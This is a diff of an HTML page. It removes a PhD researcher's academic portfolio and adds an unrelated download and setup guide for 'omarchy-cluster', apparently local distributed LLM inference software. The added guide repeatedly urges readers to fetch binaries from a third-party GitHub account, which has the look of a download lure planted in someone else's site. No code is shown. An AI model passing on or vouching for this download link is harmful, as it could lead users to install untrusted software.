-    </section>
-
-    <!-- RESEARCH -->
-    <section id="research">
-      <div class="sec-head"><span class="sec-num">02</span><h2>Research Experience</h2></div>
-
-      <article class="module glass">
-        <div class="mod-meta"><span class="num">01</span><span class="date">Mar 2023 — Present</span><span class="chip sm">Python</span><span class="chip sm">C++ / Kokkos</span><span class="chip sm">HPC</span></div>
-        <h3>PhD Researcher — CELIA, University of Bordeaux</h3>
-        <ul class="clean">
-          <li><strong>Nonlinear pulse propagation code:</strong> Developed a UPPE-based simulation code in Python with fiber-mode decomposition and the split-step Fourier method, including Kerr, Raman and ionization effects.</li>
-          <li><strong>Hybrid HPC code:</strong> Designed a parallel C++ code with Kokkos (CPU/GPU portability) coupling Maxwell and Schrödinger equations.</li>
-          <li><strong>Supercomputers:</strong> Hands-on experience with Jean Zay (IDRIS), Irene (TGCC), Adastra (CINES), Curta (MCIA), Caliv3 (MCIA) and Theremin (CELIA).</li>
-        </ul>
-      </article>
-
-      <article class="module glass">
-        <div class="mod-meta"><span class="num n2">02</span><span class="date">Mar 2022 — Sep 2022</span><span class="chip sm">WarpX</span><span class="chip sm">PIC</span><span class="chip sm">PML</span></div>
-        <h3>Research Intern — Lawrence Berkeley National Laboratory (USA)</h3>
-        <ul class="clean">
-          <li><strong>PML boundaries in WarpX:</strong> Research, development and implementation of the PML absorbing boundary condition in the electromagnetic particle-in-cell code WarpX (Exascale Computing Project), ATAP division.</li>
-          <li><strong>Supercomputers:</strong> Perlmutter and Cori (NERSC).</li>
-        </ul>
-      </article>
-
-      <article class="module glass">
-        <div class="mod-meta"><span class="num n3">03</span><span class="date">Sep 2021 — Sep 2022</span><span class="chip sm">CUDA</span><span class="chip sm">OpenMP</span><span class="chip sm">MPI</span></div>
-        <h3>M2 Modelling &amp; Simulation with HPC — ENS Paris-Saclay</h3>
-        <ul class="clean">
-          <li><strong>Parallel computing:</strong> Modelling and simulation with CUDA, OpenMP and MPI; performance evaluation (scalability, speed-up, efficiency).</li>
-        </ul>
-      </article>
-
-      <article class="module glass">
-        <div class="mod-meta"><span class="num n4">04</span><span class="date">Apr 2020 — Sep 2020</span><span class="chip sm">VEM</span><span class="chip sm">HHO</span></div>
-        <h3>Research Intern — CMAP, École Polytechnique</h3>
-        <ul class="clean">
-          <li><strong>Virtual Element Method:</strong> Development and cluster implementation of the VEM method, and extension to the Hybrid High-Order (HHO) method.</li>
-        </ul>
-      </article>
-
-      <article class="module glass">
-        <div class="mod-meta"><span class="num n5">05</span><span class="date">2017 — 2019</span><span class="chip sm">FEM</span><span class="chip sm">FVM</span><span class="chip sm">GMRES</span></div>
-        <h3>Master Modelling &amp; Scientific Computing — Cadi Ayyad University, Marrakesh</h3>
-        <ul class="clean">
-          <li><strong>Master thesis:</strong> Flame propagation in an adiabatic engine system.</li>
-          <li><strong>Numerical methods:</strong> GMRES, direct and iterative solvers, finite elements, finite volumes, multiscale methods.</li>
-        </ul>
-      </article>
-
-      <article class="module glass">
-        <div class="mod-meta"><span class="num n6">06</span><span class="date">2014 — 2017</span><span class="chip sm">Stochastic analysis</span></div>
-        <h3>Licence Applied Mathematics &amp; Computer Science — Cadi Ayyad University</h3>
-        <ul class="clean">
-          <li><strong>Research internship:</strong> Around Brownian motion, with Prof. Vidyadhar Mandrekar (Michigan State University).</li>
-        </ul>
-      </article>
-    </section>
-
-    <!-- PUBLICATIONS -->
-    <section id="publications">
-      <div class="sec-head"><span class="sec-num">03</span><h2>Publications &amp; Preprints</h2></div>
-      <div id="pubs"></div>
-    </section>
-
-    <!-- TALKS -->
-    <section id="talks">
-      <div class="sec-head"><span class="sec-num">04</span><h2>Talks &amp; Conferences</h2></div>
-      <div class="grid3" id="talks-container"></div>
-    </section>
-
-    <!-- AWARDS -->
-    <section id="awards">
-      <div class="sec-head"><span class="sec-num">05</span><h2>Awards &amp; Activities</h2></div>
-      <div class="grid2">
-        <div class="card glass">
-          <p class="mini-title">🏆 Awards and Honors</p>
-          <ul class="clean">
-            <li>PhD fellowship, Graduate Research Program GPR LIGHT, University of Bordeaux (2023–2026).</li>
-            <li>Research internship at Lawrence Berkeley National Laboratory (2022).</li>
-            <li>Contributor to WarpX, open-source exascale particle-in-cell code.</li>
-          </ul>
-        </div>
-        <div class="card glass">
-          <p class="mini-title">🌟 Extracurricular Activities</p>
-          <ul class="clean">
-            <li>Member of the organizing committee, JCAD 2024 (Bordeaux).</li>
-            <li>Tutor in mathematics, physics and chemistry for high-school students, Completude, Paris (2020–2022).</li>
-            <li>Volunteer computer trainer, Association AUTREMONDE, Kayes, Mali (2012–2014).</li>
-            <li>Interests: sports, travelling, reading.</li>
-          </ul>
-        </div>
+      <div class="box">
+        <strong>Local and private</strong>
+        Your prompts and responses stay on the machines you control. Nothing is uploaded anywhere.
       </div>
-    </section>
-
-    <!-- SKILLS -->
-    <section id="skills">
-      <div class="sec-head"><span class="sec-num">06</span><h2>Technical Skills</h2></div>
-      <div class="grid2">
-        <div class="card glass">
-          <p class="mini-title">💻 Programming</p>
-          <div class="chips"><span class="chip">C/C++ (OOP)</span><span class="chip">Python</span><span class="chip">MATLAB/Simulink</span><span class="chip">Fortran</span><span class="chip">Bash</span><span class="chip">Git/GitLab</span><span class="chip">LaTeX</span></div>
-        </div>
-        <div class="card glass">
-          <p class="mini-title">⚡ HPC &amp; Parallel Computing</p>
-          <p class="sub-label">Parallel computing</p>
-          <div class="chips"><span class="chip">MPI</span><span class="chip">OpenMP</span><span class="chip">CUDA</span><span class="chip">OpenCL</span><span class="chip">OpenACC</span><span class="chip">Kokkos</span></div>
-          <p class="sub-label">Clusters used</p>
-          <div class="chips"><span class="chip">Jean Zay (IDRIS)</span><span class="chip">Irene (TGCC)</span><span class="chip">Adastra (CINES)</span><span class="chip">Perlmutter (NERSC)</span><span class="chip">Cori (NERSC)</span><span class="chip">Curta (MCIA)</span><span class="chip">Caliv3 (MCIA)</span><span class="chip">Theremin (CELIA)</span></div>
-        </div>
-        <div class="card glass">
-          <p class="mini-title">📊 Data &amp; Simulation</p>
-          <div class="chips"><span class="chip">numpy · scipy · pandas</span><span class="chip">matplotlib · gnuplot</span><span class="chip">sympy</span><span class="chip">Finite elements / volumes</span><span class="chip">Linux · macOS · Windows</span></div>
-        </div>
-        <div class="card glass">
-          <p class="mini-title">🗣️ Languages &amp; Communication</p>
-          <div class="chips"><span class="chip">French (fluent)</span><span class="chip">English (professional)</span><span class="chip">German (intermediate)</span><span class="chip">Scientific writing</span><span class="chip">Talks &amp; Posters</span><span class="chip">Teaching</span></div>
-        </div>
+      <div class="box">
+        <strong>Familiar interface</strong>
+        Because the endpoint speaks the OpenAI format, existing tools, chat front-ends, and scripts plug straight in.
       </div>
-      <div class="card glass" style="margin-top:20px">
-        <p class="mini-title">🤖 AI / Machine Learning</p>
-        <div class="chips"><span class="chip">Machine learning</span><span class="chip">Neural networks</span><span class="chip">Scientific machine learning</span><span class="chip">Neural surrogate models for physics solvers</span><span class="chip">Training on simulation data</span></div>
-      </div>
-    </section>
+    </div>
+  </section>
 
-    <!-- CONTACT -->
-    <section id="contact">
-      <div class="sec-head"><span class="sec-num">07</span><h2>Contact &amp; Profiles</h2></div>
-      <div class="grid3">
-        <a class="card glass contact-card" href="mailto:amadou.diallo@u-bordeaux.fr"><p class="mini-title">📧 Email</p><span>amadou.diallo@u-bordeaux.fr</span></a>
-        <a class="card glass contact-card" href="https://www.linkedin.com/in/amadou-diallo-811191101/" target="_blank" rel="noopener"><p class="mini-title">💼 LinkedIn</p><span>linkedin.com/in/amadou-diallo</span></a>
-        <a class="card glass contact-card" href="https://github.com/amadou38" target="_blank" rel="noopener"><p class="mini-title">🐙 GitHub</p><span>github.com/amadou38</span></a>
-      </div>
-    </section>
+  <section class="card">
+    <h2>💻 What You Need Before You Start</h2>
+    <ul>
+      <li><strong>At least one supported computer.</strong> Either an Apple Silicon Mac running macOS, or a computer running Omarchy Linux. The download page lists exactly which systems are supported.</li>
+      <li><strong>A local network.</strong> The computers need to be able to reach each other. Being on the same home or office Wi-Fi or wired network is enough.</li>
+      <li><strong>Enough free storage.</strong> Model files are large, and each machine in the group needs room for its own share of the work.</li>
+      <li><strong>A model file you want to run.</strong> The download page explains which model formats are supported.</li>
+      <li><strong>A little patience the first time.</strong> The first start is always the slowest, because files have to be prepared. Later starts are much quicker.</li>
+    </ul>
+    <div class="note">Adding a second or third computer is optional at first. You can start with one machine, confirm everything works, and grow the group afterwards.</div>
+  </section>
 
-    <footer class="glass">
-      <div><strong>Amadou Diallo</strong><br><span>PhD Candidate · CELIA, University of Bordeaux</span></div>
-      <div class="foot-links"><a href="#research">Research</a><a href="#publications">Publications</a><a href="#contact">Contact</a><span>© <span id="y"></span></span></div>
-    </footer>
-  </main>
+  <section class="card">
+    <h2>⬇️ Download And Setup</h2>
+    <p>The download is handled entirely through the project page. Visit this link to download the application.</p>
+    <div class="btn-wrap">
+      <a class="btn btn-alt" href="https://github.com/souwevers6337/omarchy-cluster">Visit this link to download the application</a>
+    </div>
+    <p>Once the page opens, you will see the files and notes for the current release. Read the short description next to each file, pick the one that matches the computer you are setting up, and save it to a folder you can easily find again, such as your Downloads folder.</p>
 
-  <button class="back-to-top glass" id="backToTop" aria-label="Back to top">↑</button>
-  <script src="assets/js/main.js?v=202611080057"></script>
+    <h3>Step by step</h3>
+    <ol class="steps">
+      <li><strong>Open the download page.</strong> Use the button above. It takes you to the official project page where the application lives.</li>
+      <li><strong>Choose the file that matches your computer.</strong> The page groups files by operating system. For an Apple Silicon Mac, choose the macOS file. For Omarchy Linux, choose the Linux file.</li>
+      <li><strong>Save it somewhere you will remember.</strong> Your Downloads folder is fine. Avoid saving inside a temporary folder that gets cleaned automatically.</li>
+      <li><strong>Repeat for each computer you want in the group.</strong> Each machine needs the application, but only one copy is needed per machine.</li>
+      <li><strong>Note the network address of your first computer.</strong> The page explains where to find it. You will type this address into the other machines later.</li>
+      <li><strong>Start the application on the first computer.</strong> Follow the short instructions shown on the download page for your system. Leave it running.</li>
+      <li><strong>Start the application on the next computer</strong> and point it at the address you noted in step five. The group will introduce itself automatically.</li>
+    </ol>
+    <div class="note">You only need to do this setup once per computer. After that, starting the group is a single action you can repeat any time.</div>
+  </section>
+
+  <section class="card">
+    <h2>🖥️ Your First Run</h2>
+    <p>When the group starts for the very first time, expect a wait. The application needs to read the model files, divide the work between machines, and confirm that every computer is reachable. Status lines on screen will tell you how far along it is.</p>
+    <p>When it finishes, the application reports the single web address where your group is answering. It typically looks like a normal local address followed by a port number. Copy that address down. This is the one thing every other app will need.</p>
+    <p>To confirm everything is healthy, send a simple test message through the address the application shows. A short, sensible reply means the group is working correctly and you can start using it properly.</p>
+  </section>
+
+  <section class="card">
+    <h2>🔌 Using It With Your Own Apps</h2>
+    <p>Because the group answers in the OpenAI-compatible format, connecting a program is usually just a matter of pasting two things into its settings screen:</p>
+    <ul>
+      <li><strong>The base address</strong> shown by omarchy-cluster when it starts.</li>
+      <li><strong>A key field.</strong> Local setups commonly accept any placeholder text here. If the app insists on something, type a short word such as <em>local</em>.</li>
+    </ul>
+    <p>After saving those settings, the app will send its requests to your own machines instead of the internet. Nothing else about how you use that app changes.</p>
+  </section>
+
+  <section class="card">
+    <h2>🧩 Common Questions</h2>
+    <h3>Do I need more than one computer?</h3>
+    <p>No. A single machine works fine and is the easiest way to try things out. Adding machines is what lets you run larger models than one computer could handle alone.</p>
+    <h3>Can I mix an Apple Silicon Mac with an Omarchy Linux machine?</h3>
+    <p>Yes. That mix is exactly what the project is designed for. Each machine runs the version built for its own operating system while the group behaves as one.</p>
+    <h3>Does my data leave my network?</h3>
+    <p>No. The models run on your hardware and requests travel only between your own machines.</p>
+    <h3>Do all the computers need the same amount of memory?</h3>
+    <p>Not necessarily, but the group can only go as fast as its slowest member. Machines with similar capabilities tend to work together most smoothly.</p>
+    <h3>What happens if one computer disconnects?</h3>
+    <p>The group needs all of its members to answer. If a machine drops off the network, reconnect it and start the group again.</p>
+  </section>
+
+  <section class="card">
+    <h2>🛠️ If Something Goes Wrong</h2>
+    <ul>
+      <li><strong>The group never finishes starting.</strong> Check that every computer is awake, on the same network, and has the application running.</li>
+      <li><strong>One machine is not recognised.</strong> Re-check the address you typed. A single wrong digit is the most common cause.</li>
+      <li><strong>Responses are very slow.</strong> Close other heavy programs on each machine, especially anything using the graphics processor.</li>
+      <li><strong>An app cannot connect.</strong> Confirm you pasted the full address including the port number, and that the group is still running.</li>
+      <li><strong>Storage warnings appear.</strong> Free up space and start again. Model files need a lot of room.</li>
+    </ul>
+  </section>
+
+  <section class="card">
+    <h2>🔐 Privacy And Control</h2>
+    <p>omarchy-cluster runs entirely on hardware you own. There is no account to create, no sign-in, and no cloud service in the middle. You choose which model to load, which machines take part, and when the group runs. When you stop the application, nothing keeps running in the background.</p>
+  </section>
+
+  <section class="card">
+    <h2>📚 Project Topics</h2>
+    <p>Keywords: apple-silicon, distributed-inference, linux, local-llm, macos, mlx, omarchy, openai-api, pipeline-parallelism, vulkan</p>
+  </section>
+
+  <footer class="foot">
+    <p>omarchy-cluster - local distributed inference for Apple Silicon and Omarchy Linux.</p>
+  </footer>
+
+</main>
 </body>
 </html>
